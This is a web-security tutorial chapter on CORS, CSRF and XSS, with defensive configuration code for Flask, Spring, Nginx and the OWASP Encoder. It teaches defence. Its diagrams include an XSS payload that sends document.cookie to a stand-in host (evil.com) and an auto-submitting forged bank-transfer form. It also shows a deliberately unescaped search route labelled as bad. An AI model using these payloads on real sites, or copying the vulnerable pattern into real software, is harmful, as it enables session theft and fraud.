# CORS, CSRF, XSS — Web Security Essentials

> **What you'll learn**: How Cross-Origin Resource Sharing (CORS), Cross-Site Request Forgery (CSRF), and Cross-Site Scripting (XSS) work, why browsers enforce these protections, and how to defend your applications.

---

## Real-Life Analogy

Imagine you have three security problems with your **apartment building**:

1. **CORS** (Cross-Origin Resource Sharing) — Like a **delivery policy**: "Only accept packages from approved senders." If an unknown sender tries to deliver, the security guard (browser) blocks it.

2. **CSRF** (Cross-Site Request Forgery) — Like someone **forging YOUR signature** on a withdrawal slip and sending it to YOUR bank. The bank thinks it's from you because it has your account details (cookies).

3. **XSS** (Cross-Site Scripting) — Like someone slipping a **fake notice** into the apartment bulletin board that says "Enter your PIN here." Residents trust the bulletin board and give up their PINs.

```
┌─────────────────────────────────────────────────────────────┐
│                                                              │
│  CORS: "Can this OTHER website talk to my server?"           │
│         (Browser blocks unauthorized cross-origin requests)  │
│                                                              │
│  CSRF: "Is this action really from the user?"                │
│         (Attacker tricks user's browser into making requests)│
│                                                              │
│  XSS:  "Is this content safe to display?"                    │
│         (Attacker injects malicious scripts into pages)      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 1: CORS — Cross-Origin Resource Sharing

### What is the Same-Origin Policy?

Browsers have a built-in security rule: **code from one origin can only access resources from the same origin**.

An **origin** = scheme + host + port:
```
https://example.com:443   ← This is one origin
  │         │        │
scheme    host     port

Same origin:
  https://example.com/page1  ✓ Same origin as https://example.com/page2
  
Different origins:
  https://example.com     vs  http://example.com      (different scheme)
  https://example.com     vs  https://api.example.com (different host)
  https://example.com     vs  https://example.com:8080(different port)
```

### Why CORS Exists

Without CORS, any website could read your private data from other sites:

```
WITHOUT Same-Origin Policy (DANGEROUS):
┌──────────────────────────────────────────────────────────────┐
│                                                               │
│  1. You visit evil.com                                        │
│  2. evil.com's JavaScript runs: fetch("https://bank.com/     │
│     api/balance")                                             │
│  3. Browser sends request WITH your bank.com cookies          │
│  4. Bank returns your balance                                 │
│  5. evil.com reads your bank balance! 😱                      │
│                                                               │
└──────────────────────────────────────────────────────────────┘

WITH Same-Origin Policy (SAFE):
┌──────────────────────────────────────────────────────────────┐
│                                                               │
│  1. You visit evil.com                                        │
│  2. evil.com's JavaScript runs: fetch("https://bank.com/     │
│     api/balance")                                             │
│  3. Browser: "evil.com ≠ bank.com — BLOCKED!" ✓              │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### How CORS Works — The Preflight Dance

When your frontend (app.example.com) needs to call your API (api.example.com), CORS allows it:

```
┌─────────────────┐                    ┌─────────────────┐
│ app.example.com │                    │ api.example.com │
│   (Frontend)    │                    │    (Backend)    │
└────────┬────────┘                    └────────┬────────┘
         │                                      │
         │ 1. PREFLIGHT REQUEST (automatic)     │
         │    OPTIONS /api/data                  │
         │    Origin: https://app.example.com    │
         │    Access-Control-Request-Method: POST│
         │    Access-Control-Request-Headers:    │
         │      Content-Type, Authorization      │
         │─────────────────────────────────────▶│
         │                                      │
         │ 2. PREFLIGHT RESPONSE                │
         │    Access-Control-Allow-Origin:       │
         │      https://app.example.com         │
         │    Access-Control-Allow-Methods:      │
         │      GET, POST, PUT                   │
         │    Access-Control-Allow-Headers:      │
         │      Content-Type, Authorization      │
         │    Access-Control-Max-Age: 86400      │
         │◀─────────────────────────────────────│
         │                                      │
         │ 3. ACTUAL REQUEST (if preflight OK)  │
         │    POST /api/data                    │
         │    Origin: https://app.example.com   │
         │    Authorization: Bearer token        │
         │─────────────────────────────────────▶│
         │                                      │
         │ 4. RESPONSE with CORS headers        │
         │    Access-Control-Allow-Origin:       │
         │      https://app.example.com         │
         │◀─────────────────────────────────────│
```

### CORS Configuration (Python Flask)

```python
# ✓ GOOD — Specific origins
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://app.example.com", "https://admin.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "supports_credentials": True,  # Allow cookies
        "max_age": 86400,  # Cache preflight for 24 hours
    }
})
```

```python
# ❌ BAD — Never do this in production!
CORS(app, origins="*", supports_credentials=True)
# Allows ANY website to make authenticated requests to your API!
```

### CORS Configuration (Java Spring Boot)

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.example.com")  // Specific origin
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Content-Type", "Authorization")
            .allowCredentials(true)
            .maxAge(86400);
    }
}
```

---

## Part 2: CSRF — Cross-Site Request Forgery

### How CSRF Attacks Work

CSRF tricks a user's browser into making unwanted requests to a site where they're authenticated:

```
CSRF ATTACK FLOW:
┌────────┐     ┌────────────────┐     ┌──────────────┐
│  User  │     │  evil.com      │     │  bank.com    │
│(Alice) │     │  (Attacker)    │     │  (Victim)    │
└───┬────┘     └───────┬────────┘     └──────┬───────┘
    │                  │                      │
    │ 1. Alice is logged into bank.com         │
    │    (has session cookie)                  │
    │                  │                      │
    │ 2. Alice visits evil.com                 │
    │─────────────────▶│                      │
    │                  │                      │
    │ 3. evil.com has hidden form:            │
    │    <form action="bank.com/transfer"     │
    │     method="POST">                       │
    │      <input name="to" value="attacker"> │
    │      <input name="amount" value="10000">│
    │    </form>                               │
    │    <script>form.submit()</script>        │
    │                  │                      │
    │                  │ 4. Browser auto-sends │
    │                  │    bank.com cookies!  │
    │                  │─────────────────────▶│
    │                  │                      │
    │                  │    bank.com sees      │
    │                  │    valid session →    │
    │                  │    processes transfer!│
    │                  │                      │
    │ 5. $10,000 transferred to attacker! 😱   │
```

### Why CSRF Works

- Browser **automatically** sends cookies for a domain with every request to that domain
- The server can't tell if the request came from its own page or an attacker's page
- The request is **valid** because it has the real session cookie

### CSRF Protection — Token Pattern

```
CSRF TOKEN PROTECTION:
┌──────────────────────────────────────────────────────────────┐
│                                                               │
│  1. Server generates random CSRF token per session            │
│  2. Server embeds token in every form as hidden field         │
│  3. When form is submitted, server checks:                    │
│     Does the token in the form match the token in session?    │
│  4. Attacker can't know the token → attack fails!             │
│                                                               │
│  YOUR site's form:                evil.com's form:            │
│  ┌────────────────────┐          ┌────────────────────┐      │
│  │ <form action="/    │          │ <form action="/    │      │
│  │  transfer">        │          │  transfer">        │      │
│  │  <input csrf=      │          │  <!-- No CSRF      │      │
│  │   "a1b2c3d4">     │          │   token! Can't     │      │
│  │  <input amount>    │          │   guess it! -->    │      │
│  │ </form>           │          │  <input amount>    │      │
│  └────────────────────┘          │ </form>           │      │
│  Server: ✓ Token valid           │                    │      │
│                                   └────────────────────┘      │
│                                   Server: ✗ No token! REJECT  │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### CSRF Protection Code (Python Flask)

```python
# csrf_protection.py
from flask import Flask, session, request, abort
from flask_wtf.csrf import CSRFProtect
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
csrf = CSRFProtect(app)  # Automatic CSRF protection

# For API endpoints using tokens instead of cookies:
@app.route("/api/transfer", methods=["POST"])
@csrf.exempt  # APIs using Bearer tokens don't need CSRF
def api_transfer():
    # Token-based auth is immune to CSRF because
    # the attacker can't add the Authorization header
    pass
```

### CSRF Protection Code (Java Spring Security)

```java
// Spring Security enables CSRF by default for session-based auth
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                // Disable CSRF for stateless API endpoints (using JWT)
                .ignoringRequestMatchers("/api/**")
                // Enable for all form-based endpoints
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            );
        return http.build();
    }
}
```

### SameSite Cookie Attribute — Modern CSRF Protection

```
SameSite=Strict:  Cookie NEVER sent on cross-site requests
                  (Even clicking a link from another site!)
                  
SameSite=Lax:     Cookie sent on top-level navigation (GET links)
                  but NOT on cross-site POST/PUT/DELETE forms
                  (Default in modern browsers)
                  
SameSite=None:    Cookie always sent (requires Secure flag)
                  (Needed for legitimate cross-site scenarios)
```

```python
# Setting SameSite cookie
response.set_cookie(
    "session_id", 
    value=session_id,
    httponly=True,      # No JavaScript access
    secure=True,        # HTTPS only
    samesite="Lax",    # CSRF protection
    max_age=3600
)
```

---

## Part 3: XSS — Cross-Site Scripting

### How XSS Attacks Work

XSS injects malicious JavaScript into pages that other users view:

```
XSS ATTACK TYPES:
┌──────────────────────────────────────────────────────────────┐
│                                                               │
│  STORED XSS (Persistent):                                     │
│  ─────────────────────────                                    │
│  1. Attacker posts comment: <script>steal_cookies()</script>  │
│  2. Server stores it in database                              │
│  3. When other users view the page, the script EXECUTES       │
│  4. All viewers' cookies/data stolen!                         │
│                                                               │
│  REFLECTED XSS (Non-persistent):                              │
│  ────────────────────────────────                             │
│  1. Attacker crafts URL: example.com/search?q=<script>...</script>
│  2. Server reflects the input back in the response            │
│  3. Attacker sends URL to victim (phishing email)             │
│  4. Victim clicks → script executes in their browser          │
│                                                               │
│  DOM-BASED XSS:                                               │
│  ──────────────                                               │
│  1. Client-side JS reads from URL fragment (#) or other source│
│  2. Writes directly to DOM without sanitization               │
│  3. Never touches the server!                                 │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### Stored XSS — Attack Flow

```
┌────────────┐     ┌────────────┐     ┌────────────┐     ┌──────────┐
│  Attacker  │     │   Server   │     │  Database  │     │  Victim  │
└─────┬──────┘     └─────┬──────┘     └─────┬──────┘     └────┬─────┘
      │                  │                   │                  │
      │ POST /comment    │                   │                  │
      │ body: "<script>  │                   │                  │
      │  fetch('evil.com │                   │                  │
      │  /steal?c='+     │                   │                  │
      │  document.cookie)│                   │                  │
      │ </script>"       │                   │                  │
      │─────────────────▶│                   │                  │
      │                  │ Store comment      │                  │
      │                  │──────────────────▶│                  │
      │                  │                   │                  │
      │                  │    ... later ...   │                  │
      │                  │                   │                  │
      │                  │                   │   GET /comments  │
      │                  │                   │◀─────────────────│
      │                  │ Load comments     │                  │
      │                  │◀──────────────────│                  │
      │                  │                   │                  │
      │                  │ HTML with injected │                  │
      │                  │ <script> tag       │                  │
      │                  │──────────────────────────────────────▶│
      │                  │                   │                  │
      │                  │                   │    Script runs!  │
      │                  │                   │    Cookies sent  │
      │◀───────────────────────────────────────────────────────│
      │  Attacker now has│                   │                  │
      │  victim's session│                   │                  │
```

### XSS Prevention — Output Encoding

```python
# ❌ BAD — Direct insertion of user input
@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {query}</h1>"
    # If q = <script>alert('XSS')</script> → script EXECUTES!
```

```python
# ✓ GOOD — HTML escape user input
from markupsafe import escape

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {escape(query)}</h1>"
    # <script> becomes &lt;script&gt; — displays as text, doesn't execute
```

```python
# ✓ BEST — Use templates (auto-escape by default)
# Jinja2 (Flask) auto-escapes all variables
# template: <h1>Results for: {{ query }}</h1>
# Automatically escapes HTML entities
```

### Content Security Policy (CSP) — Defense in Depth

CSP tells the browser which sources of content are allowed:

```
Content-Security-Policy: 
    default-src 'self';                    # Only load from same origin
    script-src 'self' 'nonce-abc123';      # Scripts only from self + nonce
    style-src 'self' 'unsafe-inline';      # Allow inline styles
    img-src 'self' https://cdn.example.com;# Images from self + CDN
    connect-src 'self' https://api.example.com;  # AJAX only to API
    frame-ancestors 'none';                # Can't be iframed (clickjacking)
```

```python
# Setting CSP in Flask
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' https:; "
        "frame-ancestors 'none'"
    )
    return response
```

---

## How It Works Internally

### Browser's Security Model

```
┌─────────────────────────────────────────────────────────────┐
│               BROWSER SECURITY LAYERS                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Layer 1: Same-Origin Policy (SOP)                           │
│  └── JS from origin A cannot access DOM/cookies of origin B  │
│                                                              │
│  Layer 2: CORS (relaxes SOP where allowed)                   │
│  └── Server explicitly allows specific cross-origin access   │
│                                                              │
│  Layer 3: Cookie attributes                                  │
│  └── SameSite, HttpOnly, Secure control cookie behavior      │
│                                                              │
│  Layer 4: Content Security Policy (CSP)                      │
│  └── Server specifies what content sources are trusted       │
│                                                              │
│  Layer 5: Subresource Integrity (SRI)                        │
│  └── Verify external scripts haven't been tampered with      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### How XSS Bypasses Same-Origin Policy

```
Normal: evil.com JS cannot read bank.com cookies
        (Same-Origin Policy blocks it)

XSS:    Attacker injects script INTO bank.com's page
        Now the script runs AS bank.com's origin!
        → Can read bank.com cookies ✓
        → Can make requests as the user ✓
        → Can modify the page ✓
        
        This is why XSS is so dangerous — it bypasses SOP entirely!
```

---

## Code Examples — Complete Defense

### Python — Full Security Headers Middleware

```python
# security_middleware.py — Apply all browser security protections
from flask import Flask, request, abort
import secrets

app = Flask(__name__)

@app.after_request
def security_headers(response):
    """Add comprehensive security headers to every response"""
    # Prevent XSS (defense in depth with CSP)
    nonce = secrets.token_urlsafe(16)
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'unsafe-inline'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self' https://fonts.gstatic.com; "
        f"connect-src 'self' https://api.example.com; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'"
    )
    
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    
    # Prevent MIME-type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    # Force HTTPS
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    
    # Control referer information
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # Disable browser features you don't use
    response.headers['Permissions-Policy'] = (
        'camera=(), microphone=(), geolocation=(), payment=()'
    )
    
    return response
```

### Java — XSS Prevention with OWASP Encoder

```java
import org.owasp.encoder.Encode;

public class XssPreventionExample {
    
    // Different contexts need different encoding!
    
    public String safeHtmlContent(String userInput) {
        // For content inside HTML tags
        return Encode.forHtml(userInput);
        // <script>alert('XSS')</script> → &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
    }
    
    public String safeHtmlAttribute(String userInput) {
        // For HTML attribute values
        return Encode.forHtmlAttribute(userInput);
        // " onmouseover="alert('XSS') → &quot; onmouseover=&quot;alert(&#39;XSS&#39;)
    }
    
    public String safeJavaScript(String userInput) {
        // For values embedded in JavaScript
        return Encode.forJavaScript(userInput);
        // '; alert('XSS'); // → \x27; alert(\x27XSS\x27); \/\/
    }
    
    public String safeUrl(String userInput) {
        // For URL parameters
        return Encode.forUriComponent(userInput);
        // javascript:alert('XSS') → javascript%3Aalert%28%27XSS%27%29
    }
}
```

### Input Sanitization (Python — For Rich Text)

```python
# When you MUST allow some HTML (rich text editors)
import bleach

def sanitize_rich_text(user_html: str) -> str:
    """Allow safe HTML tags only — strip everything dangerous"""
    allowed_tags = ['p', 'b', 'i', 'u', 'a', 'ul', 'ol', 'li', 'br', 'h1', 'h2', 'h3']
    allowed_attrs = {'a': ['href', 'title']}  # Only safe attributes
    
    clean_html = bleach.clean(
        user_html,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True  # Remove disallowed tags entirely
    )
    
    # Also sanitize URLs in links
    clean_html = bleach.linkify(clean_html)
    return clean_html

# Example:
# Input:  '<p>Hello <script>evil()</script> <b>World</b></p>'
# Output: '<p>Hello  <b>World</b></p>'  (script tag stripped!)
```

---

## Infrastructure Examples

### Nginx — CORS + Security Headers

```nginx
server {
    listen 443 ssl;
    server_name api.example.com;

    # CORS Configuration
    location /api/ {
        # Handle preflight
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin' 'https://app.example.com';
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS';
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';
            add_header 'Access-Control-Max-Age' 86400;
            add_header 'Content-Length' 0;
            return 204;
        }

        # Actual response headers
        add_header 'Access-Control-Allow-Origin' 'https://app.example.com' always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        
        proxy_pass http://backend:8080;
    }
    
    # Security headers for all responses
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Strict-Transport-Security "max-age=31536000" always;
}
```

---

## Real-World Example

### British Airways XSS Attack (2018)
- **Attack**: Attackers injected a skimming script via a compromised third-party JavaScript
- **Impact**: 380,000 payment card details stolen
- **Duration**: Undetected for 15 days
- **Fine**: £20 million (GDPR violation)
- **Prevention**: CSP + Subresource Integrity (SRI) would have blocked it

### How GitHub Prevents CSRF
- Uses **SameSite=Lax** cookies
- Adds CSRF token to every form
- API uses token-based auth (immune to CSRF)
- Double-submit pattern for critical actions

---

## Common Mistakes / Pitfalls

| Mistake | Attack Enabled | Fix |
|---------|---------------|-----|
| `Access-Control-Allow-Origin: *` with credentials | Data theft | Specific origins only |
| Not using CSRF tokens on state-changing forms | CSRF attacks | Add CSRF tokens or use SameSite |
| Using `innerHTML` with user data | DOM XSS | Use `textContent` instead |
| Only sanitizing on input (not output) | Stored XSS | Always encode on output |
| Allowing `javascript:` URLs | XSS via links | Validate URL scheme |
| Missing CSP header | XSS easier to exploit | Implement strict CSP |
| CORS allowing localhost in production | Development leak | Environment-specific config |

---

## When to Use / When NOT to Use

### CORS:
- **Configure it** when your frontend and backend are on different origins
- **Don't use `*`** when credentials (cookies) are involved
- **Don't disable it** — understand WHY you need cross-origin access

### CSRF Protection:
- **Use it** for all state-changing requests (POST, PUT, DELETE) with cookie-based auth
- **Not needed** for token-based auth (Bearer tokens) — attacker can't add headers
- **Not needed** for GET requests (GET should never change state!)

### XSS Protection:
- **Always encode output** — context-appropriate encoding is the primary defense
- **Always use CSP** — defense in depth
- **Use frameworks** that auto-escape (React, Angular, Jinja2, Thymeleaf)

---

## Key Takeaways

- **Same-Origin Policy** is the browser's fundamental security boundary — CORS is how you safely relax it
- **CSRF** exploits the browser's automatic cookie-sending behavior — prevent with tokens or SameSite cookies
- **XSS** is the most common web vulnerability — prevent with output encoding + CSP
- **Never use `Access-Control-Allow-Origin: *` with credentials** — it defeats the purpose of SOP
- **Context matters for encoding**: HTML, attributes, JavaScript, URLs all need different encoding
- **Defense in depth**: Use multiple layers (encoding + CSP + HttpOnly cookies + SameSite)
- Modern frameworks (React, Angular) escape by default — but `dangerouslySetInnerHTML` / `[innerHTML]` bypass this

---

## What's Next?

Next, we'll explore **API Security Best Practices** — how to secure your REST APIs against common attacks including input validation, rate limiting, API key management, and more. That's Chapter 14.7.
